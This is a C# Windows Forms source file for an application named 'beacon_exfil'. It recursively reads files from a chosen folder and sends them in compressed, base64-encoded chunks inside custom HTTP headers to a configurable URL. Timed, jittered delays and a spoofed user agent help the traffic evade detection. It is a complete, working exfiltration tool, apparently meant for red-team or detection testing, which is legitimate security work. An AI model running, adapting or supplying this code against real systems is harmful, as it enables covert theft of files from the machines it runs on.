using System;
using System.Collections.Generic;
using System.Net;
using System.Windows.Forms;
using System.IO;
using System.IO.Compression;
using System.Text;


namespace beacon_exfil
{
    public partial class frmMain : Form
    {
        bool isRunning = false;
        DateTime nextBeaconTime;
        int currentDelay;
        Queue<string> directories;
        Queue<string> currentDirectoryFiles;
        string currentDirectory;
        string currentFile;
        int currentFileByteStart;
        int currentChunkNum;
        int totalFiles;
        int totalBeacons;


        /// <summary>
        /// Constructor
        /// </summary>
        public frmMain()
        {
            InitializeComponent();
        }


        /// <summary>
        /// Form load event that initializes application state.
        /// </summary>
        /// <param name="sender">Object triggering event</param>
        /// <param name="e">Event parameters</param>
        private void frmMain_Load(object sender, EventArgs e)
        {
            this.lblCurrentState.Text = "";
            this.lblCurrentDelay.Text = "";
            this.lblStatus.Text = "";
            this.lblCurrentState.Text = "";
            this.lblFileCount.Text = "";
            this.totalFiles = 0;
            this.totalBeacons = 0;

            this.lstMain.Columns.Add("Details", 625);
            this.lstMain.Columns.Add("Timestamp", 125);
            this.lstMain.View = View.Details;

            this.txtDriveMap.Text = Properties.Settings.Default.DriveMap;
            this.txtFileNumber.Text = Properties.Settings.Default.HeaderFileNumber;
            this.txtUserAgent.Text = Properties.Settings.Default.HeaderUserAgent;
            this.txtByteData.Text = Properties.Settings.Default.HeaderByteData;
            this.txtChunkNumber.Text = Properties.Settings.Default.HeaderDataChunk;
            this.txtUrl.Text = Properties.Settings.Default.Url;
            this.nudDataSize.Value = Properties.Settings.Default.DataSize;
            this.nudDelayMins.Value = Properties.Settings.Default.SendDelay;
            this.nudVariance.Value = Properties.Settings.Default.DelayVariance;
            this.nudSecondDelayMins.Value = Properties.Settings.Default.AltSendDelay;
            this.ckbRandomBytes.Checked = Properties.Settings.Default.UseRandomBytes;
            this.ckbFileNumber.Checked = Properties.Settings.Default.HeaderFileNumberEnabled;
            this.ckbChunkNumber.Checked = Properties.Settings.Default.HeaderDataChunkEnabled;
            this.ckbSecondDelay.Checked = Properties.Settings.Default.AltDelayEnabled;
        }


        /// <summary>
        /// Event that handles the Start/Stop of the beacon process
        /// </summary>
        /// <param name="sender">Object triggering event</param>
        /// <param name="e">Event parameters</param>
        private void btnStart_Click(object sender, EventArgs e)
        {
            isRunning = !isRunning;

            if (isRunning)
            {
                this.lstMain.Items.Clear();

                currentFile = "";
                currentDirectory = "";
                directories = new Queue<string>();
                currentDirectoryFiles = new Queue<string>();
                totalFiles = 0;
                totalBeacons = 0;
                currentFileByteStart = 0;
                currentChunkNum = 0;

                //this.panelParams.Enabled = false;
                //this.panelAddress.Enabled = false;
                //this.panelHeader.Enabled = false;
                this.txtUserAgent.Enabled = false;


                ShowOutput("Starting Beacon Process");
                directories.Enqueue(this.txtDriveMap.Text);
                this.timerMain.Enabled = true;
                this.btnStart.Text = "Stop";
                this.btnPause.Enabled = true;
                this.btnPause.Text = "Pause";
            }
            else
            {
                SetNextBeacon();
                this.timerMain.Enabled = false;
                
                //this.panelParams.Enabled = true;
                //this.panelAddress.Enabled = true;
                //this.panelHeader.Enabled = true;
                this.txtUserAgent.Enabled = true;

                ShowOutput("Beacon Stopped Manually");
                this.btnStart.Text = "Start";
                this.btnPause.Enabled = false;
                this.btnPause.Text = "Pause";
                this.lblCurrentState.Text = "Stopped";
            }

        }


        /// <summary>
        /// Method that handles the setting of the next beacon timestamp
        /// </summary>
        private void SetNextBeacon()
        {
            const int MILLISECONDS_PER_MIN = 60000;
            int delayMs;

            if (ckbSecondDelay.Checked)
            {
                // Even uses first delay and odd used second delay
                if (totalBeacons % 2 == 0)
                    delayMs = (int)Math.Round(this.nudDelayMins.Value * MILLISECONDS_PER_MIN, 0);
                else
                    delayMs = (int)Math.Round(this.nudSecondDelayMins.Value * MILLISECONDS_PER_MIN, 0);

            }
            else
            {
                delayMs = (int)Math.Round(this.nudDelayMins.Value * MILLISECONDS_PER_MIN, 0);
            }

            Random random = new Random();
            int varianceMax = (int)((this.nudVariance.Value / 100) * delayMs);
            int randVariance = random.Next(-1 * varianceMax, varianceMax);

            currentDelay = delayMs + randVariance;

            nextBeaconTime = DateTime.Now.AddMilliseconds(currentDelay);
        }


        private void setControlsEnabled(bool enabled)
        {

        }

        /// <summary>
        /// The main timer event that handles updating the UI and handles the delay between sending beacons
        /// </summary>
        /// <param name="sender">Object triggering event</param>
        /// <param name="e">Event parameters</param>
        private void timerMain_Tick(object sender, EventArgs e)
        {

            TimeSpan nextBeacon = new TimeSpan(nextBeaconTime.Ticks - DateTime.Now.Ticks);
            this.lblCurrentDelay.Text = "Current Delay:  " + (currentDelay / 1000).ToString() + " sec";
            var nextBeaconSeconds = Math.Round(nextBeacon.TotalSeconds, 0);
            if (nextBeaconSeconds < 0)
                nextBeaconSeconds = 0;
            this.lblStatus.Text = "Next Beacon:   " + Math.Round(nextBeaconSeconds, 0).ToString() + " sec";

            if (nextBeacon.TotalSeconds <= 0)
            {
                
                // Check to see if beacon is complete
                if (directories.Count == 0 && currentDirectoryFiles.Count == 0 && currentFile == "")
                {
                    SetNextBeacon();
                    this.timerMain.Enabled = false;
                    this.panelParams.Enabled = true;
                    this.panelAddress.Enabled = true;
                    this.panelHeader.Enabled = true;
                    ShowOutput("DONE!");
                    this.btnStart.Text = "Start";
                    isRunning = false;
                    this.btnPause.Enabled = false;
                    this.btnPause.Text = "Pause";
                    this.lblCurrentState.Text = "Stopped";
                    return;
                }

                if (!ckbRandomBytes.Checked && currentFile == "")
                {
                    this.lblCurrentState.Text = "Searching for files";
                    Application.DoEvents();
                    // Find more directories when queue is empty
                    if (currentDirectoryFiles.Count == 0)
                    {
                        do
                        {
                            currentDirectory = directories.Dequeue();
                            GetDirectories(currentDirectory);
                            GetFiles();
                        }
                        while (currentDirectoryFiles.Count == 0 && directories.Count > 0);

                        if (currentDirectoryFiles.Count > 0)
                        {
                            currentFile = currentDirectoryFiles.Dequeue();
                        }
                        else
                        {
                            currentFile = "";
                        }
                    }
                    else
                    {
                        currentFile = currentDirectoryFiles.Dequeue();
                    }
                }

                // Process the current file
                if ((!ckbRandomBytes.Checked && (currentFile != "" && File.Exists(currentFile))) || ckbRandomBytes.Checked)
                {
                    bool isFileReadComplete = false;
                    try
                    {
                        this.lblCurrentState.Text = "Sending Data";
                        Application.DoEvents();
                        byte[] bytes;
                        int bytesToRead;
                        long bytesRemaining;
                        if (ckbRandomBytes.Checked)
                        {
                            Random random = new Random();
                            bytesToRead = Convert.ToInt32(nudDataSize.Value);
                            bytesRemaining = bytesToRead;
                            bytes = new byte[bytesToRead];
                            random.NextBytes(bytes);
                            currentChunkNum = 1;
                        }
                        else
                        {
                            FileInfo fi = new FileInfo(currentFile);
                            var byteCount = Convert.ToInt32(this.nudDataSize.Value);
                            bytesRemaining = fi.Length - currentFileByteStart;
                            bytesToRead = (bytesRemaining - byteCount) > 0 ? byteCount : (int)bytesRemaining;
                            bytes = new byte[bytesToRead];
                            var fs = File.OpenRead(currentFile);
                            fs.Seek(currentFileByteStart, SeekOrigin.Begin);
                            fs.Read(bytes, 0, bytesToRead);
                            currentFileByteStart += bytesToRead;
                            currentChunkNum++;
                            fs.Close();
                        }
                        // Send the bytes
                        var status = SendData(bytes);
                        if (status)
                        {
                            if (ckbRandomBytes.Checked)
                                ShowOutput("Beacon of random data sent.  Size:  " + bytesToRead.ToString());
                            else
                                ShowOutput("Beacon for file " + currentFile + " sent " + bytesToRead.ToString() + " bytes as package number " + currentChunkNum.ToString());
                            totalBeacons++;
                        }
                        isFileReadComplete = ((bytesRemaining - bytesToRead) == 0);
                        this.lblCurrentState.Text = "Delaying";

                    }
                    catch (Exception ex)
                    {
                        ShowOutput("Error reading file " + currentFile + " " + ex.Message);
                        currentFileByteStart = 0;
                        currentChunkNum = 0;
                        currentFile = ""; // This will allow to move onto the next file
                    }

                    if (isFileReadComplete)
                    {
                        totalFiles++;
                        currentFile = "";
                        currentFileByteStart = 0;
                        currentChunkNum = 0;
                    }

                    this.lblFileCount.Text = "Beacons Sent:  " + totalBeacons.ToString();
                    SetNextBeacon();
                }

            }
            else
            {
                this.lblCurrentState.Text = "Delaying";
            }
        }


        /// <summary>
        /// Method that handles the actual sending of the byte data to the user specified destination
        /// </summary>
        /// <param name="bytes">The byte array of raw file data to send</param>
        /// <returns>True if send was successful, otherwise false</returns>
        private bool SendData(byte[] bytes)
        {
            var url = txtUrl.Text.Trim();
            var httpRequest = (HttpWebRequest)WebRequest.CreateHttp(url);
            var fileNumber = totalFiles + 1;
            var bufferOut = CompressString(bytes);

            httpRequest.Headers[txtFileNumber.Text.Trim()] = "f-" + fileNumber.ToString();
            httpRequest.Headers[txtChunkNumber.Text.Trim()] = currentChunkNum.ToString();
            httpRequest.Headers[txtByteData.Text.Trim()] = bufferOut;
            httpRequest.UserAgent = txtUserAgent.Text.Trim();

            var httpResponse = (HttpWebResponse)httpRequest.GetResponse();
            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
            {
                var result = streamReader.ReadToEnd();
            }

            if (httpResponse.StatusCode != HttpStatusCode.OK)
            {
                ShowOutput("Error sending data:  " + httpResponse.StatusDescription);
            }

            return (httpResponse.StatusCode == HttpStatusCode.OK);
        }


        /// <summary>
        /// Compresses the byte data and base64 encodes into a string.
        /// </summary>
        /// <param name="buffer">The raw byte data read from a file</param>
        /// <returns>The compressed base64 encoded string</returns>
        private string CompressString(byte[] buffer)
        {
            var memoryStream = new MemoryStream();
            using (var gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
            {
                gZipStream.Write(buffer, 0, buffer.Length);
            }

            memoryStream.Position = 0;

            var compressedData = new byte[memoryStream.Length];
            memoryStream.Read(compressedData, 0, compressedData.Length);

            var gZipBuffer = new byte[compressedData.Length + 4];
            Buffer.BlockCopy(compressedData, 0, gZipBuffer, 4, compressedData.Length);
            Buffer.BlockCopy(BitConverter.GetBytes(buffer.Length), 0, gZipBuffer, 0, 4);
            return Convert.ToBase64String(gZipBuffer);
        }


        /// <summary>
        /// Searches the specfied root path for directories and adds them to the Directory Queue for future file searches.
        /// </summary>
        /// <param name="rootPath">The path to begin directory search</param>
        private void GetDirectories(string rootPath)
        {
            try
            {
                var dirs = Directory.GetDirectories(rootPath, "*", SearchOption.TopDirectoryOnly);
                foreach (var d in dirs)
                {
                    directories.Enqueue(d);
                }
                ShowOutput("Added " + dirs.Length + " directories from " + rootPath);

            }
            catch (Exception e)
            {
                ShowOutput("Error - " + e.Message);

            }
        }


        /// <summary>
        /// Searches for files for the currently specified directory and adds any files found to the File Queue for files to read and beacon.
        /// </summary>
        private void GetFiles()
        {
            if (!Directory.Exists(currentDirectory))
            {
                ShowOutput("Error Directory Does Not Exist: " + currentDirectory);
            }

            try
            {
                var files = Directory.GetFiles(currentDirectory, "*.*", SearchOption.TopDirectoryOnly);
                foreach (var f in files)
                {
                    currentDirectoryFiles.Enqueue(f);
                }
                ShowOutput("Added " + files.Length + " files from " + currentDirectory);
            }
            catch (Exception e)
            {
                ShowOutput("Error - " + e.Message);
            }
        }


        /// <summary>
        /// Updates the main output list box with beacon information.
        /// </summary>
        /// <param name="value">The string to display with a current timestamp</param>
        private void ShowOutput(string value)
        {
            lstMain.Items.Add(new ListViewItem(new string[] { value, DateTime.Now.ToString() }));
            lstMain.Items[lstMain.Items.Count - 1].EnsureVisible();
        }


        /// <summary>
        /// Event for handling the pause/resume button
        /// </summary>
        /// <param name="sender">Object triggering event</param>
        /// <param name="e">Event parameters</param>
        private void btnPause_Click(object sender, EventArgs e)
        {
            if (!this.timerMain.Enabled)
            {
                ShowOutput("Restarted");
                this.btnPause.Text = "Pause";
                this.panelParams.Enabled = false;
                this.panelHeader.Enabled = false;
                nextBeaconTime = DateTime.Now;
            }
            else
            {
                ShowOutput("Paused");
                this.btnPause.Text = "Resume";
                this.panelParams.Enabled = true;
                this.panelHeader.Enabled = true;

            }

            this.timerMain.Enabled = !this.timerMain.Enabled;

        }


        /// <summary>
        /// Event for handling the update and local config file storage of the drive map
        /// </summary>
        /// <param name="sender">Object triggering event</param>
        /// <param name="e">Event parameters</param>
        private void txtDriveMap_TextChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.DriveMap = txtDriveMap.Text;
            Properties.Settings.Default.Save();
        }


        /// <summary>
        /// Event for handling the update and local config file storage of the user agent
        /// </summary>
        /// <param name="sender">Object triggering event</param>
        /// <param name="e">Event parameters</param>
        private void txtUserAgent_TextChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.HeaderUserAgent = txtUserAgent.Text;
            Properties.Settings.Default.Save();
        }


        /// <summary>
        /// Event for handling the update and local config file storage of the file number header title
        /// </summary>
        /// <param name="sender">Object triggering event</param>
        /// <param name="e">Event parameters</param>
        private void txtFileNumber_TextChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.HeaderFileNumber = txtFileNumber.Text;
            Properties.Settings.Default.Save();
        }


        /// <summary>
        /// Event for handling the update and local config file storage of the chunk number header title
        /// </summary>
        /// <param name="sender">Object triggering event</param>
        /// <param name="e">Event parameters</param>
        private void txtChunkNumber_TextChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.HeaderDataChunk = txtChunkNumber.Text;
            Properties.Settings.Default.Save();
        }


        /// <summary>
        /// Event for handling the update and local config file storage of the byte data header title
        /// </summary>
        /// <param name="sender">Object triggering event</param>
        /// <param name="e">Event parameters</param>
        private void txtByteData_TextChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.HeaderByteData = txtByteData.Text;
            Properties.Settings.Default.Save();
        }


        /// <summary>
        /// Event for handling the update and local config file storage of the url to beacon data to
        /// </summary>
        /// <param name="sender">Object triggering event</param>
        /// <param name="e">Event parameters</param>
        private void txtUrl_TextChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.Url = txtUrl.Text;
            Properties.Settings.Default.Save();
        }


        /// <summary>
        /// Event for handling the update and local config file storage of the delay in minutes value
        /// </summary>
        /// <param name="sender">Object triggering event</param>
        /// <param name="e">Event parameters</param>
        private void nudDelayMins_ValueChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.SendDelay = nudDelayMins.Value;
            Properties.Settings.Default.Save();
        }


        /// <summary>
        /// Event for handling the update and local config file storage of the delay variance value
        /// </summary>
        /// <param name="sender">Object triggering event</param>
        /// <param name="e">Event parameters</param>
        private void nudVariance_ValueChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.DelayVariance = Convert.ToInt32(nudVariance.Value);
            Properties.Settings.Default.Save();
        }


        /// <summary>
        /// Event for handling the update and local config file storage of the data size value
        /// </summary>
        /// <param name="sender">Object triggering event</param>
        /// <param name="e">Event parameters</param>
        private void nudDataSize_ValueChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.DataSize = Convert.ToInt32(nudDataSize.Value);
            Properties.Settings.Default.Save();
        }

        /// <summary>
        /// Event that handles browsing for folder
        /// </summary>
        /// <param name="sender">Object triggering event</param>
        /// <param name="e">Event parameters</param>
        private void btnBrowse_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog openFolderDialog= new FolderBrowserDialog();
            DialogResult result = openFolderDialog.ShowDialog(); // Show the dialog.
            if (result == DialogResult.OK) // Test result.
            {
                txtDriveMap.Text = openFolderDialog.SelectedPath;

            }
        }

        /// <summary>
        /// Enable the naming of the FileNumber in the HTML header using the text given by the user
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ckbFileNumber_CheckedChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.HeaderFileNumberEnabled = ckbFileNumber.Checked;
            Properties.Settings.Default.Save();
            txtFileNumber.Enabled = ckbFileNumber.Checked;
        }

        /// <summary>
        /// Enable the naming of the Chunk Number in the HTML header using the text given by the user
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ckbChunkNumber_CheckedChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.HeaderDataChunkEnabled = ckbFileNumber.Checked;
            Properties.Settings.Default.Save();
            txtChunkNumber.Enabled = ckbFileNumber.Checked;
        }

        /// <summary>
        /// The send delay in minutes
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void nudSecondDelayMins_ValueChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.AltSendDelay = nudSecondDelayMins.Value;
            Properties.Settings.Default.Save();
        }

        private void ckbSecondDelay_CheckedChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.AltDelayEnabled = ckbSecondDelay.Checked;
            Properties.Settings.Default.Save();
            nudSecondDelayMins.Enabled = ckbSecondDelay.Checked;
        }

        private void ckbRandomBytes_CheckedChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.UseRandomBytes = ckbRandomBytes.Checked;
            Properties.Settings.Default.Save();
            btnBrowse.Enabled = !ckbRandomBytes.Checked;
            txtDriveMap.Enabled = !ckbRandomBytes.Checked;
        }

        private void label13_Click(object sender, EventArgs e)
        {

        }

        private void label10_Click(object sender, EventArgs e)
        {

        }

        private void label11_Click(object sender, EventArgs e)
        {

        }

        private void label12_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }


}
